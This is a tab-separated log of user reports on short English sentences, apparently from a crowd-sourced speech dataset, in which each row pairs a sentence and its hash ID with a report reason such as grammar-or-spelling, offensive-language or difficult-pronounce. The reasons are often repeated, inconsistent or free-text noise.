sentence	sentence_id	locale	reason
It should not be confused with the Novodevichy Cemetery in Saint Petersburg.	0e047d99c6c75b076aa34cdd37238670b0a9340fb78737f62ae973eeaf6cea8b	en	grammar-or-spelling
It should not be confused with the Novodevichy Cemetery in Saint Petersburg.	0e047d99c6c75b076aa34cdd37238670b0a9340fb78737f62ae973eeaf6cea8b	en	offensive-language
It should not be confused with the Novodevichy Cemetery in Saint Petersburg.	0e047d99c6c75b076aa34cdd37238670b0a9340fb78737f62ae973eeaf6cea8b	en	different-language
It should not be confused with the Novodevichy Cemetery in Saint Petersburg.	0e047d99c6c75b076aa34cdd37238670b0a9340fb78737f62ae973eeaf6cea8b	en	difficult-pronounce
It should not be confused with the Novodevichy Cemetery in Saint Petersburg.	0e047d99c6c75b076aa34cdd37238670b0a9340fb78737f62ae973eeaf6cea8b	en	hh
Klima and his party heavily resented the fact that they were removed from rulership.	0e0d2e5856573b1c82cc2d93362499697d4246abc7c8fa17b347339244aab4ee	en	difficult-pronounce
Debus is a prominent member of Labor's Socialist Left faction.	0e12a5cc934957d08a7fc449640ac415bb08a434489c5dae7d88fce8f3fc84e2	en	difficult-pronounce
The female version is Branimira and Branimirka.	0e168f77437e8c2822d3c427c5fd6fe18a97de355c86da8b9aec6544873e8f98	en	difficult-pronounce
What's going on here?.	0e118966e7ae4648a9db565cbd0db76488d6c2a6f0709375b7521726ca5c7a2b	en	grammar-or-spelling
Nizhny Novgorod is divided into two parts by the Oka River.	0df4ebe1f30a107d6f73ebcbe972ed8ee631388530c72e73ca56928a844e5629	en	difficult-pronounce
Pantoprazole is a proton pump inhibitor drug that inhibits gastric acid secretion.	0e3e7b04d5509722018e42f12145393edec1fa04968e072f233dd67bcf14f398	en	difficult-pronounce
Kazuno-Hanawa Station has a single island platform serving two tracks.	0e615bb11ebe087a65be3ae1413596b8c8f83dac67a74970d8f78726d9365837	en	difficult-pronounce
Emperor Ai rewarded him with large sums of money.	0e58f6ec749667bc199004fa9b8c4faaae5e7fe1b0b14f9d09e5bd6ec8bb2406	en	difficult-pronounce
It was serialized by MediaWorks in the manga magazine Dengeki Comic Gao!	0e61d21c0162be0f3141d51fdbdc76da3a83456ae495dcd7734c32175b96a339	en	difficult-pronounce
Nopaltepec's major products are corn, fruit, sugar, and rice.	0e13d3a0871a3476ab1330392b6589a91046ad222ad9ca5ba8f32f49fe781379	en	difficult-pronounce
This was followed by seven chants of "Merdeka" by the crowd.	0e5ac572f7a8df5b83ee96486b18735f476652450cf93d6b8c415f6cc974b4cc	en	difficult-pronounce
Ore concentrates from the mine were moved south by the railroad.	0e5a13e2d3642d1e826fc9779ab41bde958074984571241a17f177eddefa5e14	en	offensive-language
Al-Hassan accused Dahlan of planning to murder him, a charge which Dahlan denied.	0e1c5ef8b3d69f00296c61eb9394334a7a6827efa27a17790858192a2030ed81	en	difficult-pronounce
Vain", "More and More" and others.	0e80d415c13588888692000fe69d15085f485ca5d884c730aa92a1652fea9a7c	en	grammar-or-spelling
In common usage, It can be stated with a question mark Cactus?	0e8e146f98ae629f631a035f1d0887e6a20b01100ba30c7e8537cd314a92faca	en	grammar-or-spelling
The cemetery is spread out over located on both sides of Catalina Blvd.	0e92c5b730ee3d6ab1b73676baf8e48b27095b930bf0d11973f9b05389d828b1	en	grammar-or-spelling
Occasional guest members include: Martin Green, Corrina Hewat and Aidan O'Rourke.	0e8df610ce121c696dc3ddb0208201b6cffe8207d4d419a5a4531195b4c818da	en	difficult-pronounce
If the Super Combo gauge is on Lv.	0e89d80092794c8b52b66aad71be0de3af89ec37a3eca86bee0d32e635780068	en	grammar-or-spelling
Women were able to divorce their husbands.	0ea41b6b487e5278920ca0c9d8d035273fadf4317d6bf180095e62c81160d280	en	grammar-or-spelling
The station is licensed to nearby Hackettstown.	0ebe3c9583a6238812508c5055bf3dc3c94b3a1da072feab210e292168ae435c	en	difficult-pronounce
Sai Kung East Country Parkoccupies a vast area of east Sai Kung Peninsula.	0ea365247076a9d006de9094160ffa37fbb4c1ce99eb7aaf74bc36a633af94a9	en	grammar-or-spelling
His Paschales atque nouiluniorum mensurni canones.	0f23be28e61e45d78ca22a48e37edb7d77ba18bf5f0f8caf5abca2d775e82ba6	en	different-language
His Paschales atque nouiluniorum mensurni canones.	0f23be28e61e45d78ca22a48e37edb7d77ba18bf5f0f8caf5abca2d775e82ba6	en	different-language
According to Vasari, he was a nephew of Taddeo di Bartolo.	0f37009246d4a8d485a242ad540bde0cd4a9b01a9c6561a7b7d8bd447fd733e0	en	offensive-language
According to Vasari, he was a nephew of Taddeo di Bartolo.	0f37009246d4a8d485a242ad540bde0cd4a9b01a9c6561a7b7d8bd447fd733e0	en	grammar-or-spelling
According to Vasari, he was a nephew of Taddeo di Bartolo.	0f37009246d4a8d485a242ad540bde0cd4a9b01a9c6561a7b7d8bd447fd733e0	en	different-language
According to Vasari, he was a nephew of Taddeo di Bartolo.	0f37009246d4a8d485a242ad540bde0cd4a9b01a9c6561a7b7d8bd447fd733e0	en	difficult-pronounce
The scales on all "Ablepharus" species are shiny and bronze in appearance.	0f57e3bfa7b3f56037ef1c6ff6dc849e2e4004363d772651b7da298669260f5c	en	grammar-or-spelling
His Paschales atque nouiluniorum mensurni canones.	0f23be28e61e45d78ca22a48e37edb7d77ba18bf5f0f8caf5abca2d775e82ba6	en	different-language
An average floater has of positive buoyancy in fresh water.	0f7d3de0aa15c5e13ea7acee84c4d9163daa979f38af2ebde4c89798e71ad6ad	en	grammar-or-spelling
His Paschales atque nouiluniorum mensurni canones.	0f23be28e61e45d78ca22a48e37edb7d77ba18bf5f0f8caf5abca2d775e82ba6	en	different-language
His Paschales atque nouiluniorum mensurni canones.	0f23be28e61e45d78ca22a48e37edb7d77ba18bf5f0f8caf5abca2d775e82ba6	en	different-language
LaFayette is home to an antebellum church, the Lafayette Methodist Church.	0feb336853daa2cadc02241acd9bb3c38d0b27362e0a24b43ce155c04333c641	en	difficult-pronounce
The stream has been sometimes called a river and sometimes a creek.	0ff36aebd88a3d63e06528f9e13e8786c56e9705113c8598026086a6cc0de1b0	en	offensive-language
The stream has been sometimes called a river and sometimes a creek.	0ff36aebd88a3d63e06528f9e13e8786c56e9705113c8598026086a6cc0de1b0	en	grammar-or-spelling
The stream has been sometimes called a river and sometimes a creek.	0ff36aebd88a3d63e06528f9e13e8786c56e9705113c8598026086a6cc0de1b0	en	different-language
The stream has been sometimes called a river and sometimes a creek.	0ff36aebd88a3d63e06528f9e13e8786c56e9705113c8598026086a6cc0de1b0	en	difficult-pronounce
The stream has been sometimes called a river and sometimes a creek.	0ff36aebd88a3d63e06528f9e13e8786c56e9705113c8598026086a6cc0de1b0	en	(951) 545-4088mhz
He grew up in various locales dictated by the requirements of his father's profession.	10290a0c772ad9e40e69a39014989855fede539425d6015f1f8e9f3134d402e0	en	offensive-language
Clavell translates Tai-Pan as "Supreme Leader".	103a78f8f9b304d6024c1ffd714514295dd39451095a3c5a9508f4b764bb5926	en	different-language
Prominent early membera were Sir John Barrow and Alexander Burnes.	0fdae94c2f621d649334a9ddd70f731713633586490112d8132464f424567799	en	grammar-or-spelling
You great booby!	07af6a4e56941a67d31f8f3f0ea8c1c4a67695d38f7d8bc0c03aec56e5b8d5b2	en	grammar-or-spelling
You great booby!	07af6a4e56941a67d31f8f3f0ea8c1c4a67695d38f7d8bc0c03aec56e5b8d5b2	en	offensive-language
He returned to South America to join Nacional of Uruguay.	10b1605a57a087163570df22acd309a73bdde4b4a3f02da57777fb48aad03ebe	en	grammar-or-spelling
Only certain calculators are capable of being used for beghilos calculator spelling.	1108214bdeaab267c251bcb244b6c388195f7e885e1a3a85a486a546691b5d2c	en	difficult-pronounce
The retail management utilizes Retalix software and is split into two divisions.	1104881512adf524c63753fb638734a5f46ae3dd804695b63fc16c4a29c7c432	en	difficult-pronounce
However, a throw is not required for a stolen base.	110e031e0b42a8d8b2548d09046e9580cbdd34000f7a69d7feff7194b5700dc0	en	offensive-language
However, a throw is not required for a stolen base.	110e031e0b42a8d8b2548d09046e9580cbdd34000f7a69d7feff7194b5700dc0	en	grammar-or-spelling
However, a throw is not required for a stolen base.	110e031e0b42a8d8b2548d09046e9580cbdd34000f7a69d7feff7194b5700dc0	en	different-language
However, a throw is not required for a stolen base.	110e031e0b42a8d8b2548d09046e9580cbdd34000f7a69d7feff7194b5700dc0	en	difficult-pronounce
It operates Macdonald High School.	1130ab41dc9f90275cc645bf05b4ce52231fa3bced8355c97cded23af9044291	en	Chugged r draft


The janggi elephant can therefore be used more offensively than the xiangqi elephant.	11aafc5ffdc39fbe0c5295c15aa1e93109f6e390bc99c1ce13dcf138c459cc69	en	different-language
The janggi elephant can therefore be used more offensively than the xiangqi elephant.	11aafc5ffdc39fbe0c5295c15aa1e93109f6e390bc99c1ce13dcf138c459cc69	en	difficult-pronounce
All of these were awarded for rescue operations.	117d3e0de36fdab3e89d699587d6fca7ef7e9833b7990647eea672d80fb3e455	en	vishnu
A bit later, other smaller developments were started west of the ferry location.	116a2a0b94da917f579f4c50aaf9c579e7d9f69f3a82bd3cbfe7ece81a2fb902	en	grammar-or-spelling
A bit later, other smaller developments were started west of the ferry location.	116a2a0b94da917f579f4c50aaf9c579e7d9f69f3a82bd3cbfe7ece81a2fb902	en	difficult-pronounce
To some they were the spirit of fate, and therefore of great importance.	11adc1237678cb0a9779923d532929f0f028d6e171ce03368a8ea69e6383ef89	en	Bb
The next stage for him was to conquest skies.	11cfd5633ba043d0140f06c345a7ece59d218e4f641e94a636114c015d892b52	en	grammar-or-spelling
The role of Snyder was originally intended for Spencer Tracy, who turned in down.	11ca4a40f722bb17f60a0a869efaeebd56468a2a0b8513e7fa8a156481ada600	en	grammar-or-spelling
This was a long sound, but over time, the vowel developed to an sound.	11bfc92ccd1236f488f33baf6f94851ff9c9b62ec43c9afbd0597a5613c4042f	en	grammar-or-spelling
From here it gains the name Blanding Boulevard from here to its northern terminus.	11d66899006e7d512c1364aba18945f05953b5a15ce40af0fc18e60c607382ba	en	grammar-or-spelling
He grew up in city of Maiduguri and attended primary schools in the city.	11c0e4a70f24b7b81e2d898e1d32285768f93b5262bcde99639200a4677cad30	en	grammar-or-spelling
Jessore district once belonged to the ancient Janapada kingdom of Samatat Janapada.	11eee1e1385da914d16c30d9433125ca245e3c417d1573691f3d66f997c5ee4f	en	difficult-pronounce
King Eystein's two sons and their men fought, but both Hogne and Frode died.	123f8d24cfb80c8c7de5555d8268c07c6f36e41ae0c4387c635980c0278a0325	en	difficult-pronounce
The railway station is on the now closed Eugowra railway line.	12439f7ff5becf3d766f0ebb5e6408e9519fc9cdc1675203af2c4a0b50f0f6be	en	difficult-pronounce
The village is located along the Payerne-Thierrens road.	124468d0277062a1a639cb5b07169faa7e2de27543e5e44be6dfa72c244e0faa	en	offensive-language
The village is located along the Payerne-Thierrens road.	124468d0277062a1a639cb5b07169faa7e2de27543e5e44be6dfa72c244e0faa	en	grammar-or-spelling
The village is located along the Payerne-Thierrens road.	124468d0277062a1a639cb5b07169faa7e2de27543e5e44be6dfa72c244e0faa	en	different-language
The village is located along the Payerne-Thierrens road.	124468d0277062a1a639cb5b07169faa7e2de27543e5e44be6dfa72c244e0faa	en	difficult-pronounce
Worthington's preferred style was the Gothic and his building designs were often similar.	12886a80d68b01be8cb31a57e5ec1625af1697703b12095630a1b0cfcb8e02a1	en	offensive-language
Worthington's preferred style was the Gothic and his building designs were often similar.	12886a80d68b01be8cb31a57e5ec1625af1697703b12095630a1b0cfcb8e02a1	en	grammar-or-spelling
Worthington's preferred style was the Gothic and his building designs were often similar.	12886a80d68b01be8cb31a57e5ec1625af1697703b12095630a1b0cfcb8e02a1	en	different-language
Worthington's preferred style was the Gothic and his building designs were often similar.	12886a80d68b01be8cb31a57e5ec1625af1697703b12095630a1b0cfcb8e02a1	en	difficult-pronounce
A pious man, Theodore patronized the Archbishop of Ravenna during his tenure.	124db8e3b0a193363ed84185025bd4c32f7d4d40d39f1d5fa5631ba94272837e	en	offensive-language
A pious man, Theodore patronized the Archbishop of Ravenna during his tenure.	124db8e3b0a193363ed84185025bd4c32f7d4d40d39f1d5fa5631ba94272837e	en	grammar-or-spelling
A pious man, Theodore patronized the Archbishop of Ravenna during his tenure.	124db8e3b0a193363ed84185025bd4c32f7d4d40d39f1d5fa5631ba94272837e	en	different-language
A pious man, Theodore patronized the Archbishop of Ravenna during his tenure.	124db8e3b0a193363ed84185025bd4c32f7d4d40d39f1d5fa5631ba94272837e	en	difficult-pronounce
A pious man, Theodore patronized the Archbishop of Ravenna during his tenure.	124db8e3b0a193363ed84185025bd4c32f7d4d40d39f1d5fa5631ba94272837e	en	Na dam maw
Espionage and intrigue were often featured instead of straightforward battles.	12d2daf4fdda7b062678beda6ea76bf50bf1103c7d8cce4c58d089f2aad89d7e	en	offensive-language
Espionage and intrigue were often featured instead of straightforward battles.	12d2daf4fdda7b062678beda6ea76bf50bf1103c7d8cce4c58d089f2aad89d7e	en	grammar-or-spelling
